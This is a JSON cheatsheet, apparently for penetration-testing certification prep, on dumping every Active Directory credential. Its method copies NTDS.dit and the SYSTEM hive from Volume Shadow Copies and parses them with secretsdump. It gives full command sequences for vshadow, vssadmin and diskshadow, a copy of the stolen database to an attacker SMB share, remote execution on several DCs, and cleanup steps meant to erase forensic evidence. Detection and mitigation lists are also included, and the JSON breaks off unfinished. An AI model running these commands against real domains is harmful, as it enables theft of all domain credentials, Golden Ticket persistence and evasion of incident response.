{
  "cheatsheets": [
    {
      "id": "ad-shadow-copy-ntds-extraction-methodology",
      "name": "Active Directory NTDS.dit Extraction via Shadow Copies",
      "description": "Complete methodology for extracting Active Directory credentials by abusing Volume Shadow Copies to access locked NTDS.dit database offline",
      "category": "active-directory",
      "subcategory": "credential-access",
      "tags": [
        "ACTIVE_DIRECTORY",
        "NTDS",
        "SHADOW_COPY",
        "VSS",
        "CREDENTIAL_ACCESS",
        "PERSISTENCE"
      ],
      "educational_header": {
        "what_is_shadow_copy": "Volume Shadow Copy Service (VSS) is a Microsoft backup technology that creates point-in-time snapshots of files or entire volumes. Shadow copies allow access to previous file versions, including files locked by the operating system. NTDS.dit is the Active Directory database containing ALL domain credentials (NTLM hashes, Kerberos keys, user objects, group memberships). During normal DC operation, NTDS.dit is exclusively locked by the lsass.exe process - cannot be copied directly. Shadow copies bypass this lock by accessing a snapshot where files appear unlocked. Combined with SYSTEM registry hive (contains boot key for decryption), NTDS.dit can be parsed offline to extract every domain credential without network detection.",
        "how_to_recognize": [
          "You have Domain Admin OR local Administrator access on a Domain Controller",
          "Target is Windows Server acting as Active Directory DC (check: echo %LOGONSERVER%, nltest /dclist:<domain>)",
          "VSS service enabled and running (default on Windows Server - verify: sc query vss)",
          "Looking for credential persistence technique that works offline without DCSync replication rights",
          "Need ALL domain credentials (not just specific users), including krbtgt hash for Golden Ticket attacks",
          "Alternative to DCSync when: (1) Want offline analysis (no network requests), (2) Already have DC access but not replication rights, (3) Prefer file-based evidence over network-based DCSync traffic"
        ],
        "when_to_look_for": [
          "POST-EXPLOITATION: After gaining Domain Admin or DC local Administrator access",
          "PERSISTENCE phase: Extracting credentials for long-term access (hashes don't change unless password reset)",
          "security assessment: HIGH priority if DC compromised - provides complete domain credential set for lateral movement",
          "CREDENTIAL HARVESTING: When DCSync unavailable/undesirable (OPSEC, rights missing, network monitoring concerns)",
          "Time estimate: 2-5 minutes total (shadow creation 10-30s, file extraction 30s, transfer 1-2min, parsing 10-60s)"
        ],
        "prerequisites": [
          "Local Administrator on Domain Controller OR SeBackupPrivilege (Backup Operators group)",
          "Volume Shadow Copy Service enabled and running (sc query vss shows STATE: RUNNING)",
          "Sufficient disk space for shadow copy (typically 10-30% of C: drive size)",
          "File transfer method to Kali: SMB share, HTTP server (python3 -m http.server), certutil base64 encoding, impacket-smbserver",
          "Impacket installed on Kali Linux (apt install impacket-scripts - includes secretsdump)",
          "NTDS.dit default path accessible: C:\\Windows\\NTDS\\ntds.dit (verify: dir C:\\Windows\\NTDS)"
        ],
        "key_differences_from_dcsync": [
          "RIGHTS: Shadow copies require local Administrator on DC. DCSync requires DS-Replication-Get-Changes extended rights (Domain Admin, Domain Controllers, Administrators groups by default).",
          "NETWORK TRAFFIC: Shadow copies = local file operations only (no network). DCSync = network traffic to DC via RPC/DRSUAPI (detectable).",
          "SCOPE: Shadow copies extract ENTIRE database (all users at once). DCSync can target specific users (lsadump::dcsync /user:krbtgt).",
          "STEALTH: DCSync often stealthier (legitimate replication traffic). Shadow copies leave file artifacts (copied NTDS.dit, SYSTEM hive, shadow copy creation events).",
          "EXECUTION LOCATION: Shadow copies require running commands ON the DC. DCSync can run remotely from any domain-joined machine with appropriate rights.",
          "FORENSICS: Shadow copies create Event 8222 (shadow created), 4663 (file access if auditing enabled), copied files on disk. DCSync creates 4662 (directory service access) with replication GUID.",
          "security assessment: Shadow copies PREFERRED when you have DC shell but uncertain about DCSync rights. DCSync PREFERRED when you have Domain Admin from workstation (no DC access needed)."
        ],
        "detection_indicators": [
          "Event ID 8222 (VSS): Shadow copy created - unusual on Domain Controllers (DCs typically don't use shadow copies for backup, prefer Windows Server Backup or dedicated solutions)",
          "Event ID 8224 (VSS): Shadow copy deleted, especially with /quiet flag (suppresses prompts, indicates scripted/automated action)",
          "Event ID 4663 (Object Access): File access audit for NTDS.dit, even via shadow copy path (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy...) - requires Object Access auditing enabled on C:\\Windows\\NTDS",
          "Event ID 4688 (Process Creation): vssadmin.exe, vshadow.exe, diskshadow.exe, reg.exe executions on DC (especially reg save HKLM\\SYSTEM)",
          "Event ID 5145 (Network Share Access): SMB file transfer of large files (ntds.dit.bak 20-500+ MB) from DC to attacker-controlled share",
          "File Integrity Monitoring (FIM): NTDS.dit copies created in unusual locations (C:\\Temp, C:\\Users\\Public, etc.), SYSTEM hive exports",
          "Network monitoring: Large outbound file transfers from DC (HTTP, SMB, certutil base64 encoding traffic)",
          "Unusual shadow copy enumeration: vssadmin list shadows, wmic shadowcopy commands on DC (rare in normal operations)"
        ],
        "mitigation_and_defense": [
          "Restrict local Administrator access on Domain Controllers - use tiered admin model (separate accounts for DC administration)",
          "Audit SeBackupPrivilege usage - Event 4672 (Special privileges assigned) when Backup Operators log on",
          "Enable Object Access auditing on C:\\Windows\\NTDS folder - configure SACL to log all file access attempts (Event 4663)",
          "Monitor VSS events 8222/8224 on DCs - alert on ANY shadow copy creation/deletion (legitimate DC backups use different methods)",
          "Deploy EDR with shadow copy monitoring - detect vssadmin, vshadow, diskshadow executions on critical servers",
          "Network segmentation - restrict outbound connections from DCs to only necessary management systems (prevents credential exfiltration)",
          "File Integrity Monitoring on NTDS.dit - alert on any access, copy, or modification attempts",
          "Regular password rotation for privileged accounts (krbtgt hash changes only during functional level upgrade - manually reset: Reset-KrbtgtKeyInteractive cmdlet)",
          "Implement Just-in-Time (JIT) admin access - temporary privilege elevation reduces attack window",
          "Use Windows Defender Application Control (WDAC) or AppLocker to restrict unauthorized tool execution on DCs"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: vshadow.exe Method (Official pentest Content)",
          "context": "You've gained Domain Admin access as user jeffadmin and established RDP connection to DC1.corp.com domain controller. You have uploaded vshadow.exe (Microsoft signed binary from Windows SDK) to C:\\Tools directory. Goal: Extract complete NTDS.dit database and parse offline on Kali to obtain all domain credentials including krbtgt hash for Golden Ticket. This is the exact method presented in assessments course materials.",
          "objective": "Create shadow copy using vshadow.exe with -nw (no-writers) flag for speed, extract NTDS.dit and SYSTEM hive, transfer to Kali, parse with impacket-secretsdump to obtain all NTLM hashes and Kerberos keys",
          "approach": [
            "1. CONNECT TO DC: Establish elevated command prompt on DC1 as jeffadmin (Domain Admin). Verify privileges: whoami /groups | findstr Administrators. Ensure vshadow.exe present: dir C:\\Tools\\vshadow.exe",
            "2. CREATE SHADOW COPY: Run vshadow.exe -nw -p C: from C:\\Tools directory. -nw flag disables VSS writers (speeds up creation from minutes to seconds). -p creates persistent shadow copy stored on disk (required for file extraction). Note output: 'Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2' (number increments: 1, 2, 3... for multiple shadows)",
            "3. EXTRACT NTDS.dit: Copy database from shadow copy to accessible location: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\ntds.dit.bak. Use .bak extension to distinguish from live database. Verify copy success: dir C:\\ntds.dit.bak (should show 20+ MB file size). Shadow copy number matches output from step 2 (HarddiskVolumeShadowCopy2 = number 2)",
            "4. SAVE SYSTEM HIVE: Export SYSTEM registry hive containing boot key for NTDS decryption: reg save HKLM\\SYSTEM C:\\system.bak. Boot key encrypts PEK (Password Encryption Keys) in NTDS.dit. Without SYSTEM hive, secretsdump cannot decrypt credentials. Verify: dir C:\\system.bak (~8-15 MB typical size)",
            "5. TRANSFER FILES TO KALI: Use file transfer method (SMB share, Python HTTP server, certutil base64). Example: On Kali: impacket-smbserver share /tmp/loot -smb2support -username kali -password kali. On DC: net use \\\\<KALI_IP>\\share /user:kali kali && copy C:\\ntds.dit.bak \\\\<KALI_IP>\\share\\ && copy C:\\system.bak \\\\<KALI_IP>\\share\\",
            "6. PARSE OFFLINE ON KALI: Navigate to directory with transferred files: cd /tmp/loot. Run secretsdump: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL. LOCAL keyword = offline file parsing (no network to target). Pipe to file for reference: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt",
            "7. EXTRACT CREDENTIALS: Secretsdump outputs: (1) NTLM hashes in format domain\\user:RID:LM:NTLM::: (fourth field is hash), (2) Kerberos keys (AES256, AES128, DES) below main output, (3) krbtgt hash (RID 502) - CRITICAL for Golden Ticket attacks. Parse krbtgt: grep krbtgt credentials.txt",
            "8. CLEANUP ON DC: Delete shadow copy to remove forensic evidence: vssadmin delete shadows /for=C: /all /quiet. Delete extracted files: del C:\\ntds.dit.bak C:\\system.bak. Verify deletion: vssadmin list shadows (should show 'No items found')"
          ],
          "commands": [
            "ad-vshadow-create-shadow",
            "ad-copy-ntds-from-shadow",
            "ad-reg-save-system-hive",
            "ad-secretsdump-parse-ntds",
            "ad-vssadmin-delete-shadows"
          ],
          "expected_outcome": "Shadow copy creation completes in 5-10 seconds with -nw flag. NTDS.dit copied successfully (20-500+ MB depending on domain size - corp.com example shows ~40 MB). SYSTEM hive exported (~10 MB). Files transferred to Kali via SMB/HTTP (1-2 minutes depending on connection). Secretsdump parsing completes in 10-60 seconds, outputs ALL domain credentials: Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: (NTLM hash), krbtgt:502:...:1693c6cefafffc7af11ef34d1c788f47::: (Golden Ticket material), dave, stephanie, jeff, jeffadmin, iis_service, and all computer accounts (DC1$, WEB04$, FILES04$, etc.). Kerberos keys extracted including AES256 for each user. Total time: 2-5 minutes from shadow creation to parsed credentials on Kali.",
          "why_this_works": "NTDS.dit is locked by lsass.exe during normal DC operation (exclusive lock prevents copying). Shadow copies create point-in-time snapshots at the volume/block level BEFORE filesystem locking is enforced. The shadow copy snapshot sees files as they existed at snapshot creation time, without active process locks. Copying from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy path accesses the snapshot (unlocked) rather than live filesystem (locked). NTDS.dit contains encrypted credentials - encryption uses boot key (syskey) stored in SYSTEM registry hive. Boot key → decrypts PEK (Password Encryption Keys List) in NTDS.dit → PEK decrypts individual user password hashes. Secretsdump: (1) Extracts boot key from SYSTEM hive, (2) Locates and decrypts PEK from NTDS.dit, (3) Enumerates user records in database, (4) Decrypts each user's NTLM hash and Kerberos keys using PEK. Result: Plaintext (actually cleartext-equivalent) NTLM hashes usable for Pass-the-Hash attacks, no cracking needed. vshadow.exe -nw speeds up process by disabling VSS writers (application-aware components like SQL, Exchange). Writers ensure application consistency during backup - not needed for NTDS.dit (AD handles its own consistency).",
          "common_mistakes": [
            "Forgetting to note shadow copy device number from vshadow output - leads to 'file not found' when copying NTDS.dit. FIX: Run vssadmin list shadows to enumerate devices and find correct number.",
            "Using wrong shadow copy number - HarddiskVolumeShadowCopy number increments with each creation (1, 2, 3...). Latest is highest number. FIX: Check vssadmin list shadows for most recent creation time.",
            "Omitting -nw flag with vshadow - shadow creation takes 1-5 minutes instead of 5-10 seconds. Writers provide no benefit for NTDS.dit extraction. ALWAYS use -nw for exam time efficiency.",
            "Forgetting to save SYSTEM hive - secretsdump fails with 'Cannot decrypt' errors. NTDS.dit alone is useless without boot key. ALWAYS run 'reg save HKLM\\SYSTEM' immediately after copying NTDS.dit.",
            "Mismatched NTDS.dit and SYSTEM hive - extracting from different machines or different time periods causes boot key mismatch. ALWAYS extract both files from SAME shadow copy in SAME session.",
            "Not deleting shadow copies after extraction - leaves forensic evidence (Event 8222) and consumes disk space. ALWAYS cleanup: vssadmin delete shadows /for=C: /all /quiet",
            "Transferring files with wrong method - certutil base64 encoding corruption, SMB authentication failures. TEST file integrity: Compare file sizes (dir on Windows vs ls -lh on Kali), verify with file command on Kali.",
            "Deleting extracted files before successful parsing - transfer corruption or secretsdump error requires re-extraction. VERIFY secretsdump success (grep Administrator credentials.txt shows hash) BEFORE deleting source files on DC.",
            "Using 'reg export' instead of 'reg save' for SYSTEM hive - creates text .reg file instead of binary hive format. Secretsdump requires binary. ALWAYS use 'reg save HKLM\\SYSTEM', NOT 'reg export'."
          ]
        },
        {
          "title": "Scenario 2: Native vssadmin Method (No Tool Upload)",
          "context": "You've compromised DC1 with Domain Admin but cannot upload files (AV blocking uploads, no write permissions in accessible directories, or OPSEC concerns about file transfers). You need to extract NTDS.dit using only native Windows utilities. vssadmin is built-in to Windows Server, requires no upload, and provides same shadow copy functionality (slightly slower creation due to writers enabled).",
          "objective": "Extract NTDS.dit database and SYSTEM hive using ONLY native Windows binaries (vssadmin, copy, reg) - zero file uploads required. Demonstrates tool-independent methodology for exam scenarios where tool upload blocked or undesirable.",
          "approach": [
            "1. VERIFY VSS SERVICE: Check Volume Shadow Copy Service running: sc query vss. Look for STATE: 4 RUNNING. If stopped: net start vss (requires Administrator). VSS enabled by default on Windows Server, rarely stopped unless intentionally disabled.",
            "2. CHECK EXISTING SHADOWS: Before creating new shadow copy, enumerate existing: vssadmin list shadows. If recent shadow copies exist (Windows Server Backup, System Restore), USE THOSE to avoid creating new artifacts. Note device name and creation time. Skip to step 4 if usable shadow found.",
            "3. CREATE SHADOW COPY (NATIVE): Run vssadmin create shadow /for=C: (no flags needed - tool handles defaults). Creation slower than vshadow -nw (30-60 seconds vs 5-10 seconds) because writers enabled (SQL, Exchange, AD ensure consistency). Output shows: 'Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3' - note the number (3 in this example).",
            "4. LIST SHADOWS FOR VERIFICATION: Confirm shadow copy created successfully: vssadmin list shadows. Find most recent entry (latest Creation Time), verify Shadow Copy Device name matches step 3 output. Copy exact device path for use in next step.",
            "5. EXTRACT NTDS.dit FROM SHADOW: Use native copy command: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit.bak. Use C:\\Windows\\Temp (writable, less monitored than C:\\Temp). Verify: dir C:\\Windows\\Temp\\ntds.dit.bak (20+ MB confirms success).",
            "6. SAVE SYSTEM HIVE: Export boot key: reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak. Both files now in same directory for easy transfer. Verify: dir C:\\Windows\\Temp\\*.bak (should show both files, ~30-500 MB combined).",
            "7. TRANSFER WITHOUT TOOLS: Native methods only: (a) Certutil base64: certutil -encode ntds.dit.bak ntds.txt, copy-paste text to Kali, certutil -decode ntds.txt ntds.dit.bak (on Kali with certutil wine/Windows VM). (b) SMB share to existing server: net use \\\\FileServer\\Share && copy *.bak \\\\FileServer\\Share\\. (c) RDP clipboard: Enable clipboard sharing, copy files via RDP session (slow, works for small databases).",
            "8. PARSE ON KALI: Same as Scenario 1: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee creds.txt. Extract Administrator, krbtgt, and user hashes. Time: 10-60 seconds parsing.",
            "9. CLEANUP THOROUGHLY: Delete shadow copy: vssadmin delete shadows /for=C: /all /quiet. Remove files: del C:\\Windows\\Temp\\ntds.dit.bak C:\\Windows\\Temp\\system.bak /F /Q. Clear recent file MRU (optional OPSEC): reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs /f"
          ],
          "commands": [
            "ad-check-vss-service",
            "ad-vssadmin-list-shadows",
            "ad-vssadmin-create-shadow",
            "ad-copy-ntds-from-shadow",
            "ad-reg-save-system-hive",
            "ad-secretsdump-parse-ntds",
            "ad-vssadmin-delete-shadows"
          ],
          "expected_outcome": "VSS service verified running. Existing shadow copies checked (may find usable snapshot, saves creation time). New shadow copy created in 30-60 seconds with vssadmin (slower than vshadow -nw but acceptable). NTDS.dit and SYSTEM extracted to C:\\Windows\\Temp (native writable location). Files transferred using native Windows methods (certutil, SMB, RDP) without uploading attack tools. Secretsdump parsing yields identical results to Scenario 1: All domain NTLM hashes, Kerberos keys, krbtgt hash for Golden Ticket. Total time: 3-7 minutes (slightly longer than vshadow method due to slower shadow creation and native file transfer limitations). ADVANTAGE: Zero tool uploads (no AV detection, no file transfer IOCs, pure LOLBAS approach). Ideal for heavily monitored environments or security assessment machines with upload restrictions.",
          "why_this_works": "Identical technical mechanism to vshadow method - shadow copies bypass NTDS.dit file lock. Only difference: vssadmin is built-in Windows component (SFC protected, signed by Microsoft, part of OS installation). No upload needed = no file transfer detection, no AV scanning of tools, no suspicious binaries on disk. Trade-off: Slightly slower (writers enabled by default with vssadmin, cannot specify -nw). Writers provide application-level consistency (SQL, Exchange checkpoint) - irrelevant for NTDS.dit (AD maintains its own consistency via ESE transaction logs). 30-60 second creation time vs 5-10 seconds is acceptable in exam context (still <1 minute). Native file transfer methods (certutil, SMB to internal shares, RDP clipboard) leverage existing Windows functionality - harder to detect than wget/curl to external attacker infrastructure. LOLBAS (Living Off The Land Binaries and Scripts) approach: Use built-in OS tools for offensive operations, reduces detection surface.",
          "common_mistakes": [
            "Not checking for existing shadow copies first - creates unnecessary new shadow (additional Event 8222 forensic artifact). ALWAYS run vssadmin list shadows before creating new.",
            "Using vshadow syntax with vssadmin - flags differ. vssadmin uses /for=C:, vshadow uses 'C:' positional. vssadmin has NO -nw equivalent (writers always enabled). Don't mix tool syntax.",
            "Saving files to C:\\Temp instead of C:\\Windows\\Temp - C:\\Temp often doesn't exist (requires manual creation: mkdir C:\\Temp). C:\\Windows\\Temp always exists and writable. Prefer existing directories.",
            "Forgetting shadow copy number increments - If 2 shadows exist, next creation is number 3 (not 1 or 2). ALWAYS verify with vssadmin list shadows after creation, use most recent.",
            "Certutil transfer without base64 validation - Binary file corruption common with copy-paste. VERIFY: Compare file sizes exactly. Test hash: certutil -hashfile ntds.dit.bak SHA256 (on both DC and Kali after transfer).",
            "Attempting to use non-existent network shares - 'net use \\\\FileServer\\Share' fails if share doesn't exist or authentication required. Test connectivity first: dir \\\\FileServer\\Share. Use shares you confirmed during enumeration.",
            "Deleting shadow copies BEFORE file transfer completes - Transfer interruption requires re-extraction (shadow already deleted). ALWAYS verify files on Kali (ls -lh, file command) BEFORE cleanup on DC.",
            "Using 'vssadmin delete shadows /oldest' instead of /all - Leaves some shadows (partial cleanup). For OPSEC, delete ALL: /all flag. For stealth/backup, keep oldest: /oldest (attacker preference varies)."
          ]
        },
        {
          "title": "Scenario 3: Automated diskshadow Scripting",
          "context": "You're conducting post-exploitation on multiple Domain Controllers (multi-forest environment, or multiple exam lab DCs). Manual shadow copy creation for each DC is time-consuming and error-prone. diskshadow provides scriptable interface allowing automated, repeatable NTDS.dit extraction across multiple targets. Useful for exam environments with 2-3 DCs, or real-world engagements with dozens of DCs.",
          "objective": "Create reusable diskshadow script for automated NTDS.dit extraction. Script handles shadow copy creation, NTDS.dit extraction, and optional mounting shadow as drive letter for simplified access. Demonstrates advanced VSS usage and exam-time efficiency through automation.",
          "approach": [
            "1. CREATE DISKSHADOW SCRIPT FILE: On DC, create script C:\\Windows\\Temp\\extract.txt with content:\n\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\meta.cab\nset verbose on\nadd volume C:\nbegin backup\ncreate\nend backup\n\nExplanation: 'set context persistent nowriters' = equivalent to vshadow -nw -p (persistent shadow, no writers). 'set metadata' = where to store shadow copy metadata (temporary CAB file). 'add volume C:' = target C: drive. 'begin backup/create/end backup' = shadow creation sequence. Create script: Use echo commands or RDP notepad.",
            "2. ALTERNATIVE: EXPOSE SCRIPT (EASIER ACCESS): Enhanced script with drive letter mounting:\n\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\meta.cab\nadd volume C:\ncreate\nexpose %vssc% Z:\n\n'expose %vssc% Z:' mounts shadow copy as Z: drive. Allows copying with simple path: copy Z:\\Windows\\NTDS\\ntds.dit C:\\ntds.dit.bak (instead of complex \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\ path). Easier for scripting/automation.",
            "3. EXECUTE DISKSHADOW SCRIPT: Run non-interactively: diskshadow /s C:\\Windows\\Temp\\extract.txt. Script executes all commands in sequence. Output shows: 'Alias VShadowID for shadow ID...', 'Shadow copy created successfully'. If using expose method, Z: drive now accessible: dir Z:\\ (shows C: drive snapshot contents).",
            "4. EXTRACT NTDS.dit: Two methods depending on script: (a) Without expose: Copy from shadow device path (get path from diskshadow output or vssadmin list shadows). (b) With expose: Simplified copy from Z: drive: copy Z:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit.bak. Exposed drive method MUCH easier, reduces typos, better for automation.",
            "5. SAVE SYSTEM HIVE: Same as other scenarios: reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak. No special handling needed for diskshadow (SYSTEM hive accessed from live registry, not shadow copy).",
            "6. TRANSFER AND PARSE: Identical to previous scenarios: Transfer both .bak files to Kali, run impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL. Extract credentials.",
            "7. CLEANUP DISKSHADOW ARTIFACTS: (a) Unexpose drive letter (if used): diskshadow interactive mode: DISKSHADOW> unexpose Z:. (b) Delete shadow copy: vssadmin delete shadows /for=C: /all /quiet OR diskshadow: DISKSHADOW> delete shadows volume C:. (c) Remove script and metadata: del C:\\Windows\\Temp\\extract.txt C:\\Windows\\Temp\\meta.cab /F /Q.",
            "8. AUTOMATION FOR MULTIPLE DCs: Create batch script or PowerShell wrapper to execute on multiple DCs: (1) Copy diskshadow script to each DC via WMI/PSExec. (2) Execute remotely: wmic /node:<DC_IP> process call create \"diskshadow /s C:\\Temp\\extract.txt\". (3) Transfer extracted files centrally. (4) Batch parse with secretsdump. Saves hours in multi-DC environments."
          ],
          "commands": [
            "ad-diskshadow-create-shadow",
            "ad-copy-ntds-from-shadow",
            "ad-reg-save-system-hive",
            "ad-secretsdump-parse-ntds",
            "ad-vssadmin-delete-shadows"
          ],
          "expected_outcome": "Diskshadow script created successfully in C:\\Windows\\Temp. Script execution completes in 10-30 seconds (similar to vssadmin, writers disabled via 'nowriters' context). If expose method used, Z: drive mounted showing shadow copy contents (dir Z:\\ works). NTDS.dit copied using simplified path (Z:\\Windows\\NTDS\\ntds.dit) - no complex \\\\?\\GLOBALROOT syntax needed. SYSTEM hive saved. Files transferred and parsed with secretsdump - identical credential output. AUTOMATION BENEFIT: Script reusable across multiple DCs without modification (same script, just transfer and execute). Multi-DC extraction time: ~5 minutes per DC vs ~3 minutes setup + 2 minutes per DC with automation (scripting saves time at scale). Total artifacts: extract.txt (script), meta.cab (metadata), exposed Z: drive (if used), shadow copy (Event 8222). Cleanup removes all artifacts.",
          "why_this_works": "diskshadow is Microsoft's enterprise shadow copy management utility (built-in since Windows Server 2008). Designed for backup scripting and automation. Script file (/s flag) enables non-interactive execution (ideal for automation, remote execution via WMI/PSExec). 'set context persistent nowriters' replicates vshadow -nw -p behavior: persistent storage (required for file extraction) + no writers (faster creation). 'expose' command is diskshadow exclusive feature (vssadmin and vshadow cannot mount shadow copies as drive letters). Exposed drive creates temporary volume mount point (similar to mounting ISO or VHD) - shadow copy accessible via standard drive letter (Z:) instead of object namespace path. Simplifies scripting: copy Z:\\path is easier than copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\path (fewer errors, more readable, better for automation). Shadow copy mechanism identical to other methods - still point-in-time snapshot bypassing file locks. Credentials extracted via same secretsdump process (boot key from SYSTEM, decrypt PEK, enumerate NTDS.dit users).",
          "common_mistakes": [
            "Script syntax errors - diskshadow scripting is sensitive. Common errors: (1) Missing 'set context' before 'create' (defaults to non-persistent or wrong context). (2) No volume added ('add volume C:' required before 'create'). (3) Invalid metadata path (directory must exist). TEST script: Run diskshadow interactively first, paste commands one-by-one to verify syntax.",
            "Metadata path in read-only location - 'set metadata C:\\Windows\\System32\\meta.cab' fails (System32 often protected). USE: C:\\Windows\\Temp\\meta.cab (always writable) or C:\\Temp\\meta.cab (if directory exists).",
            "Forgetting to unexpose drive letter - Z: drive remains mounted after shadow deletion attempt, blocks cleanup. Unexpose BEFORE deleting shadow: diskshadow → unexpose Z: → exit → vssadmin delete shadows. Or use diskshadow's own delete: DISKSHADOW> delete shadows volume C: (auto-unexposes).",
            "Using expose without drive letter availability - If Z: already in use (mapped network drive, USB device), expose fails. CHECK available letters first: wmic logicaldisk get caption (shows used letters). Use alternate letter: expose %vssc% Y: (Y, X, W typically free).",
            "Incorrect script encoding - Creating script with UTF-16 or BOM (Byte Order Mark) causes parsing errors. diskshadow expects ANSI/ASCII. CREATE script with echo commands (ANSI by default): echo set context persistent nowriters > script.txt OR use notepad with ANSI encoding (File → Save As → Encoding: ANSI).",
            "Running diskshadow interactively by mistake - Typing 'diskshadow' without /s flag enters interactive mode (DISKSHADOW> prompt). Requires manual command entry, defeats automation purpose. ALWAYS use script mode for automation: diskshadow /s <script_file>",
            "Not cleaning metadata CAB files - meta.cab left in C:\\Windows\\Temp contains shadow copy configuration details (forensic artifact). DELETE after extraction: del C:\\Windows\\Temp\\meta.cab /F /Q. Check size first (should be <1 MB, just XML metadata)."
          ]
        }
      ],
      "phases": [
        {
          "phase": "Phase 1: Prerequisites and Enumeration",
          "description": "Verify access, permissions, and VSS service status before attempting shadow copy operations. Identify existing shadow copies to avoid creating unnecessary new snapshots.",
          "steps": [
            {
              "step": "1.1 Verify Domain Admin or Local Administrator Access",
              "commands": [
                "whoami /groups",
                "net user %USERNAME% /domain"
              ],
              "output": "Mandatory Label\\High Mandatory Level (elevated prompt) AND 'CORP\\Domain Admins' in group list OR 'Local Group Memberships: *Administrators'",
              "notes": "Shadow copy creation requires Administrator privileges OR SeBackupPrivilege (Backup Operators group). Verify elevated prompt: whoami /groups | findstr /C:\"High Mandatory Level\" (UAC elevation confirmed). Alternative: Check whoami /priv | findstr SeBackupPrivilege (if enabled, sufficient even without Administrator). certification: Domain Admin automatically grants local Administrator on all domain-joined machines including DCs.",
              "time_estimate": "10-15 seconds",
              "related_commands": [
                "ad-check-vss-service"
              ]
            },
            {
              "step": "1.2 Check VSS Service Status",
              "commands": [
                "sc query vss",
                "Get-Service VSS (PowerShell)"
              ],
              "output": "STATE: 4 RUNNING, SERVICE_NAME: vss",
              "notes": "Volume Shadow Copy Service must be running. Default state: Enabled and running on Windows Server. If stopped: net start vss (requires Administrator). VSS dependencies: RPC, COM+ Event System. Service startup type should be Manual or Automatic. TROUBLESHOOTING: If 'service does not exist', VSS not installed (rare, non-standard Windows build) - shadow copies impossible, use DCSync instead.",
              "time_estimate": "5 seconds",
              "related_commands": [
                "ad-check-vss-service"
              ]
            },
            {
              "step": "1.3 Enumerate Existing Shadow Copies",
              "commands": [
                "vssadmin list shadows"
              ],
              "output": "Either 'No items found that satisfy the query' OR list of shadow copies with Creation Time and Device name",
              "notes": "CRITICAL OPSEC STEP: Check for existing shadow copies BEFORE creating new ones. Windows Server Backup, System Restore, or previous admin operations may have created usable snapshots. ADVANTAGE of using existing: (1) No Event 8222 (shadow creation) logged. (2) Legitimate shadow (backup software) vs attacker-created (forensic distinction). (3) Saves time (no creation wait). If existing shadows found: Note device name (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN) and skip to Phase 3 (extraction). If no existing: Proceed to Phase 2 (creation). EXAM TIP: Existing shadows rare in certification labs (clean snapshots for each student), but check anyway (habit for real engagements).",
              "time_estimate": "5 seconds",
              "related_commands": [
                "ad-vssadmin-list-shadows"
              ]
            },
            {
              "step": "1.4 Verify NTDS.dit Location",
              "commands": [
                "dir C:\\Windows\\NTDS\\ntds.dit",
                "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\""
              ],
              "output": "File size shown (20+ MB typical) OR registry value showing path (default: C:\\Windows\\NTDS\\ntds.dit)",
              "notes": "Confirm NTDS.dit location before shadow copy extraction (custom installations may use different paths). Default path: C:\\Windows\\NTDS\\ntds.dit (90%+ of DCs). Alternative locations: D:\\NTDS\\ntds.dit (separate data volume), custom paths from IFM (Install From Media). Registry query shows definitive path (even for custom installs). If custom path: Adjust shadow copy extraction command to match. File size validation: <20 MB suspicious (even tiny domains have >20 MB database with schema, configuration partitions). Large domains: 100-500+ MB common (corporate DCs with 5000+ users).",
              "time_estimate": "10 seconds",
              "related_commands": []
            },
            {
              "step": "1.5 Check Available Disk Space",
              "commands": [
                "wmic logicaldisk where \"DeviceID='C:'\" get FreeSpace,Size",
                "dir C:\\"
              ],
              "output": "FreeSpace showing at least 10-30% of Size value available",
              "notes": "Shadow copies consume disk space (differential storage - typically 10-30% of volume size). Insufficient space causes shadow creation failure: 'Error: Insufficient storage available to create shadow copy'. CALCULATION: If C: is 100 GB, shadow copy may use 10-30 GB (depends on file change rate, default VSS allocation). VERIFY: FreeSpace >= 20 GB recommended for safety (10 GB minimum). TROUBLESHOOTING: If space insufficient: (1) Delete old shadows: vssadmin delete shadows /for=C: /oldest. (2) Resize shadow storage: vssadmin resize shadowstorage /for=C: /maxsize=10GB. (3) Clean temporary files: del C:\\Windows\\Temp\\* /F /Q. (4) Use alternative method if space critical (DCSync requires no disk space).",
              "time_estimate": "10 seconds",
              "related_commands": []
            }
          ]
        },
        {
          "phase": "Phase 2: Shadow Copy Creation",
          "description": "Create volume shadow copy using one of four methods. Method selection based on: tool availability (vshadow.exe uploaded?), OPSEC requirements (native vs uploaded tools), and time constraints (vshadow -nw fastest, vssadmin slower but native).",
          "methods": [
            {
              "method": "Method A: vshadow.exe (Fastest, Requires Upload)",
              "commands": [
                "vshadow.exe -nw -p C:"
              ],
